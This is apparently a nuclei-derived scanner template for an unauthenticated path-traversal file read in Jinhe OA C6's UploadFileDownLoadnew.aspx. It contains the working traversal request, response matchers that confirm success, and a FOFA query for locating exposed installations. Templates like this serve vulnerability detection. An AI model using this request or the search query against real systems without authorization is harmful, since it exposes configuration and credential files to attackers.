@@ -1,0 +1,142 @@
+{
+  "id": "jinhe-oa-c6-upload-lfi",
+  "name": "Jinhe OA_C6_UploadFileDownLoadnew - Arbitrary File Read",
+  "author": "pussycat0x",
+  "severity": "HIGH",
+  "description": "There is an arbitrary file reading vulnerability in the UploadFileDownLoadnew.aspx interface of Jinhe OA C6. An unauthenticated attacker can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be in Extremely unsafe state.\n",
+  "references": [
+    "https://github.com/wy876/POC/blob/main/%E9%87%91%E5%92%8COA_C6_UploadFileDownLoadnew%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
+  ],
+  "tags": [
+    "jinhe-oa-c6",
+    "misconfig"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "body\u003d\"JHSoft.Web.AddMenu\" || app\u003d\"金和网络-金和OA\""
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/c6/JHSoft.Web.CustomQuery/UploadFileDownLoadnew.aspx/?FilePath\u003d../Resource/JHFileConfig.ini",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "MaxFolderTotal\u003d1",
+            "[JHFile]",
+            "FolderTotal\u003d1"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "jinhe-oa-c6-upload-lfi",
+    "info": {
+      "name": "Jinhe OA_C6_UploadFileDownLoadnew - Arbitrary File Read",
+      "author": "pussycat0x",
+      "severity": "high",
+      "description": "There is an arbitrary file reading vulnerability in the UploadFileDownLoadnew.aspx interface of Jinhe OA C6. An unauthenticated attacker can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be in Extremely unsafe state.\n",
+      "reference": [
+        "https://github.com/wy876/POC/blob/main/%E9%87%91%E5%92%8COA_C6_UploadFileDownLoadnew%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
+      ],
+      "metadata": {
+        "max_request": 1,
+        "fofa_query": "body\u003d\"JHSoft.Web.AddMenu\" || app\u003d\"金和网络-金和OA\""
+      },
+      "tags": "jinhe-oa-c6,misconfig"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/c6/JHSoft.Web.CustomQuery/UploadFileDownLoadnew.aspx/?FilePath\u003d../Resource/JHFileConfig.ini"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "MaxFolderTotal\u003d1",
+              "[JHFile]",
+              "FolderTotal\u003d1"
+            ],
+            "condition": "and",
+            "case_insensitive": false
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
